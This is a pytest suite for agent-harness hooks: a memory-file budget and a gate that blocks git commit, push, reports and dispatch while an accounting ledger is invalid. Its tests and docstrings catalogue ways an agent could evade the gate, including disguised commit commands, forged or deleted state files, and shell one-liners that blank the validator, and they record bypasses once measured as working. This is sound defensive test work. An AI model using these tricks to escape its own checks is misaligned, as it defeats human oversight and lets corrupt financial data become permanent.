    every ordinary write to another drive, and burned the fail-closed channel on a budget gate."""
    payload = memory_write(tmp_path, "x", "content")
    payload["tool_input"]["file_path"] = "Z:\\elsewhere\\notes.md"
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_codex_patch_is_reported_as_unmeasured_not_as_empty(tmp_path):
    """`_compat.load` normalises an apply_patch's tool NAME and paths but leaves the body in
    `tool_input.command`, so the content read as the empty string: 0 lines, 0 bytes, no ids —
    every budget passed on Codex while looking measured."""
    os.makedirs(str(tmp_path / "project_memory"), exist_ok=True)  # _audit writes only into one
    patch = ("*** Begin Patch\n*** Add File: .claude/agent-memory/backend-developer/big.md\n"
             + "".join("+line %d\n" % i for i in range(500)) + "*** End Patch\n")
    payload = {"hook_event_name": "PreToolUse", "tool_name": "apply_patch", "cwd": str(tmp_path),
               "tool_input": {"command": patch}}
    result = run_budget(tmp_path, payload)
    assert result.returncode == 0
    # UNCONDITIONALLY: an earlier cut guarded this on `if audit.exists()` without ever creating a
    # project_memory, so the only assertion that distinguishes "reported as unmeasured" from
    # "silently measured as empty" — the whole point of the test — never ran.
    audit = tmp_path / "project_memory" / ".audit" / "hook_events.jsonl"
    assert audit.exists(), "the unmeasured-content note was never recorded"
    assert "not modelled" in audit.read_text(encoding="utf-8")


# -- the mutation survivors -----------------------------------------------------

def test_the_byte_budget_is_measured_in_utf8(tmp_path):
    """German craft notes are ~2 bytes per character, and II.5 budgets KB — a character count
    would let a topic be twice its budget."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/a.md",
                           "ä" * 4100 + "\n")
    assert run_budget(tmp_path, payload).returncode == 2
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/b.md",
                           "ä" * 4000 + "\n")
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_file_without_a_trailing_newline_counts_its_last_line(tmp_path):
    content = "\n".join("- line %d" % i for i in range(41))  # 41 lines, no trailing newline
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md", content)
    assert run_budget(tmp_path, payload).returncode == 2


def test_the_index_is_not_subject_to_the_topic_budget(tmp_path):
    """First match wins in the table: an index of 45 lines must fail on the INDEX budget (40),
    not pass because it is under the topic budget (100)."""
    content = "".join("- line %d\n" % i for i in range(45))
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/MEMORY.md", content)
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "INDEX" in result.stderr


def test_replace_all_is_honoured(tmp_path):
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "a.md"
    write(str(path), "x\n" * 60)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "cwd": str(tmp_path),
               "tool_input": {"file_path": str(path), "old_string": "x\n",
                              "new_string": "x\nx\n", "replace_all": True}}
    assert run_budget(tmp_path, payload).returncode == 2


def test_multiedit_applies_every_edit(tmp_path):
    """Only the FIRST edit being applied would under-measure exactly the shape most likely to
    blow a budget."""
    path = tmp_path / ".claude" / "agent-memory" / "backend-developer" / "a.md"
    write(str(path), "a\nb\n" + "line\n" * 97)  # 99 lines: ONE edit lands on 100, TWO on 101
    both = {"hook_event_name": "PreToolUse", "tool_name": "MultiEdit", "cwd": str(tmp_path),
            "tool_input": {"file_path": str(path), "edits": [
                {"old_string": "a\n", "new_string": "a\na2\n"},
                {"old_string": "b\n", "new_string": "b\nb2\n"}]}}
    assert run_budget(tmp_path, both).returncode == 2
    # the discriminating half: applying only the FIRST edit lands exactly ON the budget, so a
    # gate that stops after one would pass this same payload
    first_only = {"hook_event_name": "PreToolUse", "tool_name": "MultiEdit", "cwd": str(tmp_path),
                  "tool_input": {"file_path": str(path), "edits": [
                      {"old_string": "a\n", "new_string": "a\na2\n"}]}}
    assert run_budget(tmp_path, first_only).returncode == 0


def test_a_post_tool_use_event_does_nothing(tmp_path):
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/a.md", "x\n" * 200)
    payload["hook_event_name"] = "PostToolUse"
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_five_digit_id_is_still_an_id(tmp_path):
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/n.md",
                           "See TSK-00042 for the retry rule.")
    assert run_budget(tmp_path, payload).returncode == 2


def test_the_budget_table_is_data():
    """spec II.5 asks for a matcher CONFIGURATION, so the table must be enumerable — by a test,
    by `python scripts/harness.py doctor`, by whatever wires the matchers — rather than re-derived from control
    flow."""
    module = load_hook_module("guard_memory_budget")
    ids = [b["id"] for b in module.BUDGETS]
    assert ids == ["memory-index", "craft-topic", "memory-other", "root-index"]
    assert module.BUDGETS[0]["max_lines"] == 40
    assert module.BUDGETS[1]["max_lines"] == 100 and module.BUDGETS[1]["max_bytes"] == 8192
    assert module.BUDGETS[1]["max_per_role"] == 20


@pytest.mark.parametrize("rel", [
    ".claude/agent-memory/notes.md",                       # no role directory
    ".claude/agent-memory/MEMORY.md",                      # the index, no role directory
    "agent-memory/backend-developer/topic.md",             # memory tree at the repo root
    ".claude/agent-memory/a/b/c/deep.md",                  # deeper than the pattern assumed
])
def test_the_trigger_does_not_depend_on_directory_depth(tmp_path, rel):
    """`BUDGETS` used fnmatch patterns written as `**/agent-memory/**/*.md`. fnmatch has no `**`
    — `*` simply spans separators — so `**/x/**/y` still requires a component BETWEEN the two, i.e.
    a role directory, and a repo-root `agent-memory/` had nothing before it either. II.5's trigger
    is `agent-memory/**`; selection is now by path COMPONENT."""
    payload = memory_write(tmp_path, rel, "TSK-0042 broke\n" + "line\n" * 300)
    assert run_budget(tmp_path, payload).returncode == 2, rel


def test_a_non_markdown_memory_file_is_budgeted_too(tmp_path):
    """The `.md` suffix in the pattern meant every other extension was unchecked, so the 0.96 MiB
    of measured bloat could return under one rename. Bytes only: a pasted fixture is not a craft
    topic, so neither the line budget nor the id rule fits it."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/dump.txt", "x" * 9000)
    result = run_budget(tmp_path, payload)
    assert result.returncode == 2
    assert "memory file" in result.stderr


def test_a_small_non_markdown_memory_file_passes(tmp_path):
    """...and it is budgeted on bytes ALONE — 300 short lines of a fixture are not a violation."""
    payload = memory_write(tmp_path, ".claude/agent-memory/backend-developer/d.txt",
                           "TSK-0042\n" + "line\n" * 300)
    assert run_budget(tmp_path, payload).returncode == 0


def test_a_file_outside_agent_memory_is_not_this_gates_business(tmp_path):
    payload = memory_write(tmp_path, "docs/notes.md",
                           "TSK-0042 " + "".join("line %d\n" % i for i in range(200)))
    assert run_budget(tmp_path, payload).returncode == 0


def test_each_role_has_its_own_topic_budget(tmp_path):
    """Twenty topics for one role must not exhaust another role's allowance."""
    base = tmp_path / ".claude" / "agent-memory"
    for i in range(20):
        write(str(base / "backend-developer" / ("topic%d.md" % i)), "craft\n")
    payload = memory_write(tmp_path, ".claude/agent-memory/frontend-developer/first.md", "craft\n")
    assert run_budget(tmp_path, payload).returncode == 0


# -- gate_ledger_valid (office): edits allowed, validation mandatory (II.9) ----

OFFICE_HOOKS = os.path.join(TEAM_KITS, "office-team", "hooks")
OFFICE_SCRIPTS = os.path.join(TEAM_KITS, "office-team", "templates", "repo", "scripts")
LEDGER_COLS = ("id,doc_date,payment_date,direction,doc_type,counterparty,invoice_no,net,vat_rate,"
               "gross,vat_treatment,category,source,reverses,note\n")
GOOD_ROW = ("L2026-0001,2026-01-05,2026-01-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,"
            "standard,tools,archive/a.pdf,,\n")
BAD_ROW = ("L2026-0002,2026-01-05,2026-01-07,expense,invoice,ACME,R-2,100.00,19.00,150.00,"
           "standard,tools,archive/b.pdf,,\n")


def ledger_repo(tmp_path, rows=GOOD_ROW):
    """An office repo with its validator installed and a ledger in the given state."""
    os.makedirs(str(tmp_path / "scripts"), exist_ok=True)
    shutil.copy(os.path.join(OFFICE_SCRIPTS, "ledger_add.py"),
                str(tmp_path / "scripts" / "ledger_add.py"))
    path = tmp_path / "ledger" / "2026.csv"
    write(str(path), LEDGER_COLS + rows)
    return path


# The harness bound for a gate that has a wall-clock budget of its own, DERIVED from that budget
# rather than typed as a number beside it. `gate_ledger_valid.TOTAL_BUDGET` is 40 s and the tests
# below deliberately give it validators that never return, so the hook is expected to spend most
# of that budget every time; a harness bound close to it measures the machine, not the gate. The
# flat 120 s this replaces was 3x, and 3x was measurably not enough: the whole-suite run in which
# `test_unjudged_files_are_reported_as_unjudged_not_as_broken` raised TimeoutExpired had other
# pytest processes and a leftover busy-loop competing for the CPU. Measured idle afterwards, ten
# runs of that test: 24.0–42.9 s wall with a median of 24.2 — the 42.9 s outlier on an IDLE
# machine is what says 3x is the wrong factor, not the one failure. 5x is the margin the two
# linearity tests above buy themselves. Read OFF the gate, so a kit that retunes its budget cannot
# leave a stale multiple of it here.
LEDGER_HARNESS_FACTOR = 5


def ledger_harness_timeout():
    return LEDGER_HARNESS_FACTOR * load_hook_module("gate_ledger_valid", OFFICE_HOOKS).TOTAL_BUDGET


def run_ledger(tmp_path, payload):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    return subprocess.run([sys.executable, os.path.join(OFFICE_HOOKS, "gate_ledger_valid.py")],
                          input=json.dumps(payload), capture_output=True, text=True,
                          env=env, timeout=ledger_harness_timeout())


def edited(tmp_path, path, event="PostToolUse"):
    return {"hook_event_name": event, "tool_name": "Edit", "cwd": str(tmp_path),
            "tool_input": {"file_path": str(path)}}


def shell(tmp_path, command):
    return {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(tmp_path),
            "tool_input": {"command": command}}


def shell_post(tmp_path, command):
    return {"hook_event_name": "PostToolUse", "tool_name": "Bash", "cwd": str(tmp_path),
            "tool_input": {"command": command}}


def marker(tmp_path):
    return tmp_path / ".claude" / "ledger_state.json"


def state_file(tmp_path):
    return tmp_path / ".claude" / "ledger_state.json"


def test_a_valid_ledger_edit_is_accepted(tmp_path):
    """The whole point of I.3/1: an edit is no longer forbidden. A correct one is silent."""
    path = ledger_repo(tmp_path)
    result = run_ledger(tmp_path, edited(tmp_path, path))
    assert result.returncode == 0
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 0


def test_a_broken_ledger_edit_is_reported_to_the_model(tmp_path):
    """PostToolUse cannot block — the edit already happened — so II.9 asks for a visible INVALID
    state and explicitly claims no rollback. Exit 2 here does not deny the call; it is the
    documented way to put stderr in front of the MODEL. Exiting 0 meant the agent that broke the
    ledger was never told, and met the consequence several tool calls later as an unexplained
    refusal to commit."""
    path = ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    result = run_ledger(tmp_path, edited(tmp_path, path))
    assert result.returncode == 2
    assert "INVALID" in result.stderr
    assert "No rollback" in result.stderr
    assert "!= gross" in result.stderr


@pytest.mark.parametrize("command", [
    'git "commit" -m x',
    "git co''mmit -m x",
    "git com\\\nmit -m x",
    'eval "git commit -m x"',
    'iex "git commit -m x"',
    "git commit>/dev/null -m x",
    "git>/dev/null commit -m x",
])
def test_a_disguised_commit_is_still_blocked_by_a_broken_ledger(tmp_path, command):
    """II.9 keeps commit blocked until the books are correct, and quoting is not a correction.

    This gate spelled the whole invocation as a regex and searched two views for it — the raw text
    and the prose-stripped one. `git "commit"` is invisible to both: the raw text has a quote where
    the pattern wants the verb, and the prose-stripped view deleted the span the verb was in. So an
    INVALID ledger reached HEAD, which is the one outcome the gate exists to prevent. What an
    operation IS cannot be a question about quoting; it is the git subcommand.

    The last three are the same sentence about the shared reader's other two blind spots, both
    measured reaching HEAD with broken books: PowerShell's `eval` (`iex`, on a tool this kit gates
    in its own right), and a redirection, which ends a shell word and did not end this one —
    `commit>/dev/null` was read as the subcommand.
    """
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 2, command
    assert "INVALID" in result.stderr, (command, result.stderr)


# -- the enforcing path validates, it does not read a note --------------------

def test_a_forged_state_file_does_not_release_the_block(tmp_path):
    """THE architectural finding of round 2, in one test. The block used to be derived from a
    marker file that a PostToolUse sweep maintained — so writing `{"findings": []}` into it, or
    forging a size+mtime stamp, released commit/push/merge/reports/dispatch with the corruption
    still in place. A gate whose verdict comes from a document the guarded party can write is a
    gate on that document."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    run_ledger(tmp_path, shell_post(tmp_path, "true"))
    write(str(state_file(tmp_path)),
          json.dumps({"ledger/2026.csv": {"findings": [], "stamp": "1:1"}}))
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2


def test_deleting_the_state_file_does_not_release_the_block(tmp_path):
    """The counterpart, and the nastier half: with a cache deciding what to re-check, removing the
    marker left the file "seen" forever — the block was gone and the ledger was never looked at
    again until its size or mtime moved."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    run_ledger(tmp_path, shell_post(tmp_path, "true"))
    if state_file(tmp_path).exists():
        os.remove(str(state_file(tmp_path)))
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2


def test_an_unwritable_state_dir_does_not_release_the_block(tmp_path):
    """`except OSError: pass` around the marker write meant a `.claude` that could not be written
    produced the message "commit, push, merge … stay blocked" and then allowed the push."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    write(str(tmp_path / ".claude"), "not a directory")
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2


def test_a_write_and_commit_in_one_call_is_refused(tmp_path):
    """`sed -i … && git add -A && git commit` committed BEFORE any PostToolUse sweep ran, because
    PreToolUse only read the state left by the previous call."""
    path = ledger_repo(tmp_path)
    run_ledger(tmp_path, shell_post(tmp_path, "true"))
    write(str(path), LEDGER_COLS + BAD_ROW)          # what the sed does
    result = run_ledger(tmp_path, shell(
        tmp_path, "sed -i s/119/150/ ledger/2026.csv && git add -A && git commit -m x"))
    assert result.returncode == 2


def test_a_preserved_mtime_does_not_hide_a_rewrite(tmp_path):
    """size+mtime is defeated by `touch -r` — and non-adversarially by `cp -p`, `tar -p`,
    `robocopy /COPY:T`. It is still used, but only to decide what to WARN about; the block does
    not depend on it."""
    path = ledger_repo(tmp_path)
    run_ledger(tmp_path, shell_post(tmp_path, "true"))
    before = os.stat(str(path))
    write(str(path), LEDGER_COLS + BAD_ROW)          # same length
    os.utime(str(path), ns=(before.st_atime_ns, before.st_mtime_ns))
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2


def test_a_corrupt_state_file_with_no_ledger_is_not_a_deadlock(tmp_path):
    """Fail-closed on an unreadable marker plus a sweep that had no CSV to sweep produced a repo
    where commit, push, reports AND dispatch were refused forever, with a remedy that could not
    work — `--validate` never touched the marker, and both ways to remove it were themselves
    blocked. Only a human outside the agent could break it."""
    ledger_repo(tmp_path)
    os.remove(str(tmp_path / "ledger" / "2026.csv"))
    write(str(state_file(tmp_path)), '{"ledger/2026.csv"')
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 0


def test_nothing_has_to_be_cleared_after_a_fix(tmp_path):
    """With the verdict computed live, "clearing the mark" is not a step the agent can get wrong."""
    path = ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2
    write(str(path), LEDGER_COLS + GOOD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 0


# -- what is blocked, and what must stay possible -----------------------------

@pytest.mark.parametrize("command", ["git push origin main", "git merge feat/x",
                                     "git commit -m 'books'", "git -c user.name=x commit -m y",
                                     "git.exe commit -m x", 'eval "git commit -m x"',
                                     "git tag v1", "git format-patch -1", "git revert HEAD",
                                     "git bundle create out.bundle HEAD",
                                     "python scripts/euer_report.py --year 2026"])
def test_the_follow_on_operations_are_blocked_while_invalid(tmp_path, command):
    """II.9: "Dispatch, Commit, Merge und Reports bleiben bis zur Korrektur blockiert." `commit`
    was missing while this gate's own docstring quoted the sentence containing it — and commit is
    the one that makes broken money data permanent and shareable."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 2
    assert "INVALID" in result.stderr


@pytest.mark.parametrize("command", [
    'sudo "git" commit -m x',
    'env "git" commit -m x',
    "git --attr-source HEAD commit -m x",
    "git --config-env a.b=C commit -m x",
    "git --brand-new HEAD commit -m x",
    "git $'commit' -m x",
    "V=commit; git $V -m x",
    "git com`mit -m x",
])
def test_no_spelling_of_the_verb_lets_a_broken_ledger_reach_head(tmp_path, command):
    """II.9 is about the OPERATION, and every line here is a commit however it is written.

    Measured as real `gate_ledger_valid` processes against an INVALID ledger: `git "commit" -m x`
    was refused (rc 2) and `sudo "git" commit -m x` was not (rc 0) — a broken cash book in HEAD
    for the price of one word in front. Same for a global option the reader did not know
    (`--attr-source HEAD commit` read its verb as `head`) and for ANSI-C quoting (`$'commit'` read
    as `$commit`).
    """
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 2, command
    assert "INVALID" in result.stderr, (command, result.stderr)


def test_a_ledger_path_broken_over_a_line_continuation_is_still_that_path(tmp_path):
    """The half of the continuation fix this gate owns, and the half no test covered.

    `_normalise_pipeline` was moved onto `_compat.join_line_continuations` because this hook's own
    copy joined with a SPACE, which splits the very path the write-and-commit rule is about — the
    comment at `_PIPE_AMP_RX` even names `led\\<newline>ger/2026.csv` as the case. Restoring the
    space-join in a scratch copy left all 57 tests around this gate green: nothing in the suite
    ever handed it a continuation INSIDE a token, so the fix was unmeasured.
    """
    ledger_repo(tmp_path)                       # CLEAN at the moment of the call
    command = "sed -i s/119.00/150.00/ led\\\nger/2026.csv && git commit -m x"
    result = run_ledger(tmp_path, shell(tmp_path, command))
    assert result.returncode == 2
    assert "SAME call" in result.stderr


def test_dispatch_is_blocked_while_invalid(tmp_path):
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Agent", "cwd": str(tmp_path),
               "tool_input": {"subagent_type": "bookkeeper"}}
    assert run_ledger(tmp_path, payload).returncode == 2


@pytest.mark.parametrize("command", ["git add ledger/2026.csv", "git status", "git diff",
                                     "python scripts/einvoice_extract.py inbox/x.xml",
                                     "python scripts/ledger_add.py --validate ledger/2026.csv",
                                     "python scripts/ledger_add.py --help"])
def test_the_work_that_produces_the_correction_stays_allowed(tmp_path, command):
    """A block that also stops the repair is a deadlock. Staging the fix, reading the state,
    EXTRACTING a document (which reads no ledger) and RUNNING the validator are how the agent gets
    out — the last one matters most, and an over-broad write rule had blocked it."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0


@pytest.mark.parametrize("command", [
    "sed -i s/x/y/ scripts/ledger_add.py",
    "cp /tmp/x.py scripts/ledger_add.py",
    "rm .claude/ledger_state.json",
    "echo {} > .claude/ledger_state.json",
    "python -c \"open('scripts/ledger_add.py','w').write('')\"",
    "python -c \"import os;os.remove('.claude/ledger_state.json')\"",
    "py -c \"open('scripts/ledger_add.py','w')\"",
    "node -e \"require('fs').writeFileSync('scripts/ledger_add.py','')\"",
])
def test_the_judge_cannot_be_rewritten_from_the_shell(tmp_path, command):
    """An exemption for "running the validator" that blanked the whole first token after `python`
    also exempted every `-c` payload — including, verbatim, the command the code comment claimed
    was caught. An interpreter running a SCRIPT is exempt; one carrying an inline payload is not."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2


def test_the_validator_is_on_the_enforcement_layer():
    """The gate's docstring CLAIMED `guard_harness_selfmod` covered `scripts/ledger_add.py`; that
    guard only ever looked under `.claude/`. So an agent facing a ledger block could Write the
    validator into `sys.exit(0)` and free itself — a stated protection that did not exist, which
    is worse than an open hole because it is what the design was argued from."""
    module = load_hook_module("guard_harness_selfmod")
    assert "scripts/ledger_add.py" in module.BLOCKED_REPO_PATHS


def test_the_state_file_is_on_the_enforcement_blocklist():
    module = load_hook_module("guard_harness_selfmod")
    assert "ledger_state.json" in module.BLOCKED_FILES


# -- the shell half: the hole that deleting guard_ledger_direct created -------

def test_a_shell_write_to_the_ledger_is_caught(tmp_path):
    """THE regression the deletion created. `guard_ledger_direct` refused Edit/Write outright,
    which made the shell the SECOND way in; validating only Edit/Write made it the first. `sed
    -i`, `tee`, `cp`, `git checkout --` and `>>` all write money data, and none is an Edit."""
    path = ledger_repo(tmp_path)
    run_ledger(tmp_path, shell_post(tmp_path, "true"))
    write(str(path), LEDGER_COLS + GOOD_ROW + BAD_ROW)
    result = run_ledger(tmp_path, shell_post(tmp_path, "sed -i s/119/150/ ledger/2026.csv"))
    assert "INVALID" in result.stderr
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 2


def test_a_multi_file_patch_validates_every_ledger(tmp_path):
    """`_compat.file_paths` exists precisely because a Codex patch is ONE call touching many
    files. Reporting inside the loop exited on the first finding, so the second ledger was never
    examined — and fixing the first then released the commit."""
    os.makedirs(str(tmp_path / "ledger"), exist_ok=True)
    ledger_repo(tmp_path, BAD_ROW)
    write(str(tmp_path / "ledger" / "2025.csv"),
          LEDGER_COLS + BAD_ROW.replace("2026", "2025").replace("L2025-0002", "L2025-0001"))
    patch = ("*** Begin Patch\n*** Update File: ledger/2025.csv\n@@\n-x\n+y\n"
             "*** Update File: ledger/2026.csv\n@@\n-x\n+y\n*** End Patch\n")
    result = run_ledger(tmp_path, {"hook_event_name": "PostToolUse", "tool_name": "apply_patch",
                                   "cwd": str(tmp_path), "tool_input": {"command": patch}})
    assert "2025.csv" in result.stderr and "2026.csv" in result.stderr


def test_an_unchanged_ledger_costs_no_validator_run(tmp_path):
    """The warning sweep runs on every shell call, so it has to be free when nothing happened."""
    ledger_repo(tmp_path)
    run_ledger(tmp_path, shell_post(tmp_path, "true"))
    os.remove(str(tmp_path / "scripts" / "ledger_add.py"))  # any run would now report it missing
    assert run_ledger(tmp_path, shell_post(tmp_path, "true")).returncode == 0


# -- what counts as OUR ledger ------------------------------------------------

@pytest.mark.parametrize("rel", ["archive/2026/ledger/backup.csv", "inbox/ledger/export.csv"])
def test_only_the_canonical_ledger_dir_is_judged(tmp_path, rel):
    """Matching any path with a `ledger` component meant a bank export dropped in `inbox/ledger/`
    was judged against the accounting schema and blocked the whole project — while the enforcing
    sweep globbed only `ledger/*.csv`, so the two halves disagreed about which files they covered
    and a file could be marked and then never re-checked. One definition, used by both."""
    ledger_repo(tmp_path)
    write(str(tmp_path / rel), LEDGER_COLS + BAD_ROW)
    run_ledger(tmp_path, edited(tmp_path, tmp_path / rel))
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 0


def test_a_ledger_outside_the_repo_is_not_ours(tmp_path):
    ledger_repo(tmp_path)
    foreign = tmp_path.parent / "other" / "ledger" / "2026.csv"
    write(str(foreign), LEDGER_COLS + BAD_ROW)
    run_ledger(tmp_path, edited(tmp_path, foreign))
    assert run_ledger(tmp_path, shell(tmp_path, "git commit -m x")).returncode == 0


# -- "we could not tell" is not "it is fine" ----------------------------------

def test_a_missing_validator_is_not_a_pass(tmp_path):
    ledger_repo(tmp_path)
    os.remove(str(tmp_path / "scripts" / "ledger_add.py"))
    result = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
    assert result.returncode == 2
    assert "missing" in result.stderr


def test_a_validator_that_hangs_is_not_a_pass(tmp_path):
    """Untested before, and the branch could not have fired anyway: the timeout was 60s, which IS
    the platform's default per-hook budget, so the hook was killed first and left no verdict."""
    ledger_repo(tmp_path)
    write(str(tmp_path / "scripts" / "ledger_add.py"),
          "import time\nwhile True:\n    time.sleep(1)\n")
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
    assert module.VALIDATE_TIMEOUT < 60, "must fit inside the platform's hook budget"
    findings = module._validate(str(tmp_path), str(tmp_path / "ledger" / "2026.csv"))
    assert findings and "UNJUDGED" in findings[0]


def test_a_validator_that_cannot_start_is_not_a_pass(tmp_path, monkeypatch):
    ledger_repo(tmp_path)
    module = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)

    def boom(*_a, **_kw):
        raise OSError("Exec format error")

    monkeypatch.setattr(module._compat, "run_captured", boom)
    findings = module._validate(str(tmp_path), str(tmp_path / "ledger" / "2026.csv"))
    assert findings and "UNJUDGED" in findings[0]


def test_a_non_ledger_edit_is_not_this_gates_business(tmp_path):
    ledger_repo(tmp_path)
    payload = edited(tmp_path, tmp_path / "notes.md")
    assert run_ledger(tmp_path, payload).returncode == 0


def test_an_unrelated_command_is_not_blocked_while_invalid(tmp_path):
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    for command in ("ls", "pytest -q", "python scripts/ledger_add.py --help"):
        assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("rows,expected", [
    (GOOD_ROW + BAD_ROW, "!= gross"),
    (LEDGER_COLS.replace("id,", "ID,"), "header does not match"),
    ("L2026-0001,2026-13-45,,expense,invoice,ACME,R-1,100.00,19.00,119.00,standard,t,a.pdf,,\n",
     "not a YYYY-MM-DD date"),
    ("L2026-0001,2025-01-05,2025-01-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,standard,t,"
     "a.pdf,,\n", "does not belong in ledger/2026.csv"),
    (GOOD_ROW + "L2026-0002,2026-02-05,2026-02-07,expense,invoice,ACME,R-1,100.00,19.00,119.00,"
                "standard,tools,archive/c.pdf,,\n", "duplicate invoice"),
    (GOOD_ROW + "L2026-0002,2026-02-05,2026-02-07,expense,reversal,ACME,,100.00,19.00,119.00,"
                "standard,tools,archive/c.pdf,L2026-0999,\n", "exists in no ledger file"),
])
def test_the_validator_covers_what_ii9_names(tmp_path, rows, expected):
    """spec II.9 lists the checks by name: "Schema, Datum, Pflichtspalten, Netto/Steuer/Brutto,
    Rechnungsnummern-Dubletten, referenzielle Konsistenz — formuliert auf CSV-Spalten"."""
    path = ledger_repo(tmp_path, "")
    write(str(path), rows if rows.startswith("id,") or rows.startswith("ID,")
          else LEDGER_COLS + rows)
    result = run_ledger(tmp_path, edited(tmp_path, path))
    assert result.returncode == 2, result.stderr
    assert expected in result.stderr, result.stderr
def test_the_early_warning_cache_is_on_the_enforcement_blocklist():
    """An agent that could write `.claude/ledger_invalid.json` could clear its own block."""
    payload = {"tool_name": "Write", "cwd": ".",
               "tool_input": {"file_path": ".claude/ledger_invalid.json", "content": "{}"}}
    del payload  # the guard resolves paths against the repo root; asserted via its blocklist
    module = load_hook_module("guard_harness_selfmod")
    assert "ledger_state.json" in module.BLOCKED_FILES


# -- cross-kit copies must stay byte-identical --------------------------------

def _hook_files(kit):
    """The `.py` files a kit ships in its hooks directory."""
    return {name for name in os.listdir(os.path.join(TEAM_KITS, kit, "hooks"))
            if name.endswith(".py")}


GATE_LAUNCHER = "_gate.py"


def _registered_commands(kit):
    """(event, matcher, command) for everything that puts a hook of this kit on an event.

    BOTH SOURCES, because a kit registers in two places and a check that read one of them would
    treat the other half as undocumented: `settings/settings.json` registers session-wide, and each
    agent's frontmatter `hooks:` block registers role-scoped (that half is what
    `gen_provider_artifacts.agent_hook_entries` translates for Codex). Read as DATA in both cases —
    JSON and YAML — never as text over the file.

    The two derivations below start here so they cannot disagree about what a registration IS while
    disagreeing on purpose about what a registration NAMES.
    """
    import yaml

    found = []

    def walk(blocks):
        for event, groups in (blocks or {}).items():
            for group in groups or []:
                for hook in (group.get("hooks") or []):
                    if hook.get("type") == "command" and hook.get("command"):
                        found.append((event, str(group.get("matcher", "")), hook["command"]))

    with open(os.path.join(TEAM_KITS, kit, "settings", "settings.json"), encoding="utf-8") as fh:
        walk(json.load(fh).get("hooks"))
    agents = os.path.join(TEAM_KITS, kit, "agents")
    for name in sorted(os.listdir(agents)):
        with open(os.path.join(agents, name), encoding="utf-8-sig") as fh:
            text = fh.read()
        if text.startswith("---"):
            walk((yaml.safe_load(text.split("---", 2)[1]) or {}).get("hooks"))
    return found


def _scripts_in(command):
    """Every `.py` file name a registered command names, launcher included, in written order."""
    return re.findall(r"[A-Za-z0-9_]+\.py", command.replace("\\", "/"))


def _gates_in(command):
    """The GATES a registered command runs — its scripts minus the launcher that starts them.

    THE SCRIPT IS THE GATE, NOT THE LAUNCHER. Every V2 gate is registered as `_gate.py gate_x.py`,
    so taking the first `.py` in the command would attribute every registration in the kit to one
    file and make every statement derived from this vacuous — a search that saw only the launcher
    is how the wiring check in this suite once came to assert nothing at all. A command that names
    the launcher ALONE is credited to it, because then there is no gate to credit instead.

    That is an ATTRIBUTION rule, and reading it as a delivery rule cost the launcher its coverage:
    dropping `_gate.py` out of the mapping drops it out of everything derived from the mapping, so
    the one file whose compile decides ~20 gates could be deleted from a kit with every check here
    green (measured 2026-07-28). Delivery is asked of `_scripts_in` instead — see
    `test_every_registered_hook_script_is_shipped_by_its_kit`.

    A FUNCTION because it had been written out by hand four times, the last of them in the same
    round that split attribution and delivery apart here — and that copy spelled the launcher as a
    literal, so it would have kept its own answer through any rename of `GATE_LAUNCHER`.
    """
    names = _scripts_in(command)
    return [name for name in names if name != GATE_LAUNCHER] or names


def _hook_registrations(kit):
    """{script filename: {event: {matcher, …}}} — which GATE is registered where (see `_gates_in`)."""
    found = {}
    for event, matcher, command in _registered_commands(kit):
        for name in _gates_in(command):
            found.setdefault(name, {}).setdefault(event, set()).add(matcher)
    return found


def _tools_in(matcher):
    """A matcher as the SET OF TOOLS it names — `Write|Edit` and `Edit|Write` are one registration."""
